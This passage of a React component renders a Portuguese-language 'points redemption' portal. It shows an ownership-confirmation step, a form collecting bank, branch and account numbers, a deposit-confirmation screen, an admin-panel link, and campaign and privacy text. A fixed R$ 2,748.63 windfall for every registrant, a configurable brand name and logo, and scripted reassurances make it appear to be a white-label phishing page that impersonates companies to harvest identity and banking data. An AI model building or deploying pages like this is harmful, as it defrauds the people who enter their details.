                </p>
                <h1 className="font-display text-2xl font-bold text-[#151515] mb-2">
                  Confirmação de titularidade
                </h1>
                <p className="text-sm text-neutral-600 mb-6">
                  Confira seus dados cadastrais e confirme a titularidade para informar a conta corrente de depósito.
                </p>

                <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-6">
                  <div className="px-4 py-3.5 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Nome completo do beneficiário</dt>
                    <dd className="font-semibold text-[#151515] text-right">
                      {consultaResult.profileLabel}
                    </dd>
                  </div>
                  <div className="px-4 py-3.5 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">CPF</dt>
                    <dd className="font-mono font-medium text-[#151515] tabular-nums">
                      {consultaResult.cpfMasked}
                    </dd>
                  </div>
                  <div className="px-4 py-3.5 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Quantidade de pontos</dt>
                    <dd className="font-mono font-semibold text-[#151515] tabular-nums">
                      {displayPoints.toLocaleString('pt-BR')} {settings.pointsLabel}
                    </dd>
                  </div>
                  <div className="px-4 py-3.5 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Valor equivalente em reais</dt>
                    <dd className="font-display font-bold text-base text-[#C8006B] tabular-nums">
                      {formatBrl(displayAmountBrl)}
                    </dd>
                  </div>
                </dl>

                <label className="flex items-start gap-3 mb-6 p-4 rounded-lg border border-neutral-200 bg-neutral-50/70 text-xs sm:text-sm text-[#151515] cursor-pointer">
                  <input
                    type="checkbox"
                    checked={ownershipChecked}
                    disabled={ownershipConfirmed}
                    onChange={(e) => {
                      setOwnershipChecked(e.target.checked);
                      if (stepError) setStepError(null);
                    }}
                    className="mt-0.5 accent-[#FE0A8C] w-4 h-4 shrink-0"
                  />
                  <span>
                    Confirmo que sou o titular dos dados cadastrais apresentados acima e autorizo o prosseguimento para a solicitação de resgate.
                  </span>
                </label>

                {!ownershipConfirmed ? (
                  <>
                    {stepError && (
                      <div
                        role="alert"
                        className="mb-5 p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
                      >
                        <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
                        <span>{stepError}</span>
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={handleConfirmOwnershipAction}
                      className="w-full h-14 px-6 bg-[#151515] hover:bg-neutral-800 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer"
                    >
                      <span>CONFIRMAR TITULARIDADE</span>
                      <ArrowRight className="w-5 h-5" aria-hidden="true" />
                    </button>
                  </>
                ) : (
                  <form onSubmit={handleSubmitRedeem} noValidate className="space-y-5 pt-2 border-t border-neutral-200">
                    <div className="p-3.5 rounded-lg bg-emerald-50 border border-emerald-200 text-xs sm:text-sm text-emerald-800 flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 shrink-0" aria-hidden="true" />
                      <span>Titularidade confirmada. Informe os dados da conta corrente de sua titularidade para depósito.</span>
                    </div>

                    <div>
                      <label
                        htmlFor="bank-name"
                        className="block text-sm font-medium text-[#151515] mb-1.5"
                      >
                        <span className="inline-flex items-center gap-1.5">
                          <Building2 className="w-4 h-4 text-neutral-500" aria-hidden="true" />
                          <span>Banco</span>
                        </span>
                      </label>
                      <input
                        id="bank-name"
                        type="text"
                        required
                        maxLength={80}
                        value={bankLabel}
                        onChange={(e) => {
                          setBankLabel(e.target.value);
                          if (stepError) setStepError(null);
                        }}
                        placeholder="Ex.: Banco do Brasil — 001"
                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                      />
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label
                          htmlFor="bank-agency"
                          className="block text-sm font-medium text-[#151515] mb-1.5"
                        >
                          Agência
                        </label>
                        <input
                          id="bank-agency"
                          type="text"
                          inputMode="numeric"
                          required
                          maxLength={5}
                          value={agency}
                          onChange={(e) => {
                            setAgency(onlyDigits(e.target.value).slice(0, 5));
                            if (stepError) setStepError(null);
                          }}
                          placeholder="Ex.: 1234"
                          className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                        />
                      </div>

                      <div>
                        <label
                          htmlFor="bank-account"
                          className="block text-sm font-medium text-[#151515] mb-1.5"
                        >
                          Conta corrente (com dígito)
                        </label>
                        <input
                          id="bank-account"
                          type="text"
                          inputMode="text"
                          required
                          maxLength={14}
                          value={accountNumber}
                          onChange={(e) => {
                            setAccountNumber(e.target.value.replace(/[^0-9xX-]/g, '').toUpperCase());
                            if (stepError) setStepError(null);
                          }}
                          placeholder="Ex.: 123456-0"
                          className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                        />
                      </div>
                    </div>

                    <div className="p-3.5 rounded-lg bg-neutral-50 border border-neutral-200 text-xs text-neutral-600 leading-relaxed flex items-start gap-2">
                      <ShieldCheck className="w-4 h-4 text-[#FE0A8C] shrink-0 mt-0.5" aria-hidden="true" />
                      <span>
                        A solicitação será analisada e processada para a conta corrente informada. Nunca solicitamos senha bancária, código de autenticação pessoal ou cobrança de taxa.
                      </span>
                    </div>

                    <label className="flex items-start gap-2.5 text-xs sm:text-sm text-[#151515] cursor-pointer">
                      <input
                        type="checkbox"
                        checked={acceptedDepositTerms}
                        onChange={(e) => {
                          setAcceptedDepositTerms(e.target.checked);
                          if (stepError) setStepError(null);
                        }}
                        className="mt-0.5 accent-[#FE0A8C] w-4 h-4 shrink-0"
                      />
                      <span>
                        Confirmo que a conta corrente informada é de minha titularidade e autorizo o registro da solicitação de resgate de {formatBrl(displayAmountBrl)}.
                      </span>
                    </label>

                    {stepError && (
                      <div
                        role="alert"
                        className="p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
                      >
                        <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
                        <span>{stepError}</span>
                      </div>
                    )}

                    <button
                      type="submit"
                      disabled={submittingRedeem}
                      className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] disabled:bg-[#FE0A8C]/60 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm"
                    >
                      <span>
                        {submittingRedeem ? 'Registrando solicitação...' : 'SOLICITAR RESGATE'}
                      </span>
                      {!submittingRedeem && <ArrowRight className="w-5 h-5" aria-hidden="true" />}
                    </button>
                  </form>
                )}
              </motion.div>
            </div>
          </section>
        )}

        {/* ETAPA 4 — TELA FINAL DO RESGATE (tema padrão do portal) */}
        {step === 'resgatado' && consultaResult && (
          <section className="flex-1 bg-neutral-50 py-10 lg:py-16">
            <div className="max-w-2xl mx-auto px-4 sm:px-6">
              <motion.div
                key="redemption-done"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.25 }}
                className="bg-white text-[#151515] border border-neutral-200 rounded-xl p-6 sm:p-8"
              >
                <div className="flex items-center gap-2.5 text-emerald-700 mb-2">
                  <CheckCircle2 className="w-7 h-7 shrink-0" aria-hidden="true" />
                  <h1 className="font-display text-xl sm:text-2xl font-bold text-[#151515]">
                    SOLICITAÇÃO DE RESGATE RECEBIDA!
                  </h1>
                </div>
                <p className="text-sm text-neutral-600 leading-relaxed mb-6">
                  Seus dados foram enviados com sucesso. Acompanhe o processamento do seu resgate.
                </p>

                <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-5">
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Beneficiário</dt>
                    <dd className="font-semibold text-[#151515] text-right">
                      {consultaResult.profileLabel}
                    </dd>
                  </div>
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Valor solicitado</dt>
                    <dd className="font-display font-bold text-[#151515] tabular-nums">
                      {formatBrl(displayAmountBrl)}
                    </dd>
                  </div>
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Banco</dt>
                    <dd className="font-medium text-[#151515] text-right">
                      {consultaResult.bankLabel || bankLabel}
                    </dd>
                  </div>
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Agência / Conta corrente</dt>
                    <dd className="font-mono font-medium text-[#151515] tabular-nums text-right">
                      Ag. {consultaResult.agencyMasked || '-'} · CC {consultaResult.accountMasked || '-'}
                    </dd>
                  </div>
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Número de protocolo</dt>
                    <dd className="font-mono font-semibold text-[#151515] tabular-nums">
                      {consultaResult.protocol}
                    </dd>
                  </div>
                  <div className="px-4 py-3 flex items-center justify-between gap-4">
                    <dt className="text-neutral-500">Situação da solicitação</dt>
                    <dd className="font-semibold text-[#C8006B] text-right">
                      Em análise cadastral e bancária
                    </dd>
                  </div>
                </dl>

                <div
                  className={`mb-6 p-4 rounded-xl border text-xs sm:text-sm leading-relaxed ${
                    consultaResult.guaranteed24h
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-900 font-semibold'
                      : 'bg-neutral-50 border-neutral-200 text-neutral-700'
                  }`}
                >
                  {consultaResult.guaranteed24h
                    ? 'PREVISÃO DE DEPÓSITO: ATÉ 24 HORAS'
                    : consultaResult.depositForecast ||
                      'Pedido em análise cadastral e bancária. A previsão de depósito será confirmada após a aprovação da solicitação pelo setor responsável.'}
                </div>

                <button
                  type="button"
                  onClick={handleReset}
                  className="w-full h-12 px-5 bg-[#151515] hover:bg-neutral-800 text-white text-sm font-semibold rounded-xl transition-colors cursor-pointer"
                >
                  Nova consulta
                </button>
              </motion.div>
            </div>
          </section>
        )}
      </main>

      {/* Rodapé com identificação do programa, regulamento e privacidade LGPD */}
      <footer className="bg-[#151515] text-neutral-300 border-t border-neutral-800">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 text-sm">
          <div className="flex flex-wrap items-center gap-3">
            <BrandMark
              brandName={settings.brandName}
              brandLogoUrl={settings.brandLogoUrl}
              size="sm"
              theme="dark"
            />
            <span aria-hidden="true">·</span>
            <span className="text-neutral-400 text-xs sm:text-sm">
              © {new Date().getFullYear()} {settings.brandName} · Todos os direitos reservados
            </span>
          </div>
          <div className="flex flex-wrap items-center gap-5 text-xs sm:text-sm text-neutral-300">
            <button
              type="button"
              onClick={focusContactSection}
              className="hover:text-[#FE0A8C] transition-colors cursor-pointer"
            >
              Cadastro de contato
            </button>
            <button
              type="button"
              onClick={() => setLegalModal('regulamento')}
              className="hover:text-[#FE0A8C] transition-colors cursor-pointer"
            >
              Regulamento da Campanha
            </button>
            <button
              type="button"
              onClick={() => setLegalModal('privacidade')}
              className="hover:text-[#FE0A8C] transition-colors cursor-pointer"
            >
              Política de Privacidade (LGPD)
            </button>
            <button
              type="button"
              onClick={() => onNavigate('/painel')}
              className="hover:text-[#FE0A8C] transition-colors cursor-pointer"
            >
              Painel Admin
            </button>
          </div>
        </div>
      </footer>

      {/* Modal de Regulamento e Política de Privacidade (LGPD) */}
      <AnimatePresence>
        {legalModal && (
          <motion.div
            key="legal-modal"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
            role="dialog"
            aria-modal="true"
            aria-labelledby="legal-modal-title"
          >
            <motion.div
              initial={{ opacity: 0, y: 12, scale: 0.98 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 12, scale: 0.98 }}
              className="bg-white text-[#151515] rounded-xl border border-neutral-200 max-w-lg w-full p-6 max-h-[85vh] overflow-y-auto"
            >
              <div className="flex items-start justify-between gap-4 pb-4 border-b border-neutral-200 mb-4">
                <div className="flex items-center gap-2">
                  <FileText className="w-5 h-5 text-[#FE0A8C] shrink-0" aria-hidden="true" />
                  <h3 id="legal-modal-title" className="font-display text-lg font-bold">
                    {legalModal === 'regulamento'
                      ? `Regulamento da Campanha — ${settings.brandName}`
                      : `Política de Privacidade (LGPD) — ${settings.brandName}`}
                  </h3>
                </div>
                <button
                  type="button"
                  onClick={() => setLegalModal(null)}
                  aria-label="Fechar"
                  className="p-1.5 text-neutral-500 hover:text-[#151515] rounded-lg cursor-pointer"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              {legalModal === 'regulamento' ? (
                <div className="space-y-3 text-sm text-neutral-700 leading-relaxed">
                  <p>
                    <strong>1. Objeto do Programa:</strong> A campanha promocional promovida por{' '}
                    <strong>{settings.brandName}</strong> concede um benefício fixo único de{' '}
                    <strong>45.811 pontos</strong>, equivalentes a <strong>R$ 2.748,63</strong>, aos participantes que realizarem o cadastro válido nesta página.
                  </p>
                  <p>
                    <strong>2. Regra de Concessão Única:</strong> É permitida apenas uma concessão e uma solicitação de resgate por CPF, sendo bloqueadas solicitações duplicadas no servidor.
                  </p>
                  <p>
                    <strong>3. Processamento e Segurança:</strong> Após a confirmação de titularidade e preenchimento dos dados de conta corrente, a solicitação recebe protocolo individual e entra em análise de processamento. O programa não exige pagamento de taxas antecipadas nem solicita senhas bancárias, códigos de autenticação ou tokens.
                  </p>
                </div>
              ) : (
                <div className="space-y-3 text-sm text-neutral-700 leading-relaxed">
                  <p>
                    <strong>1. Finalidade do Tratamento (LGPD):</strong> Os dados informados (nome completo, CPF, telefone com DDD, agência e conta corrente) são tratados exclusivamente para registro do participante na campanha de{' '}
                    <strong>{settings.brandName}</strong>, prevenção de concessões duplicadas e processamento da solicitação de resgate.
                  </p>
                  <p>
                    <strong>2. Minimização e Proteção:</strong> O CPF é protegido por função criptográfica no servidor para controle de unicidade, e apenas versões mascaradas de CPF, telefone, agência e conta corrente são mantidas para exibição e auditoria.
                  </p>
                  <p>
                    <strong>3. Direitos do Titular:</strong> Em conformidade com a Lei Geral de Proteção de Dados (Lei nº 13.709/2018), o titular pode solicitar confirmação, correção ou exclusão dos registros junto à administração do portal.
                  </p>
                </div>
              )}

              <div className="mt-6 flex justify-end">
                <button
                  type="button"
                  onClick={() => setLegalModal(null)}
                  className="h-10 px-5 bg-[#151515] hover:bg-neutral-800 text-white text-sm font-semibold rounded-lg transition-colors cursor-pointer"
                >
                  Fechar
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
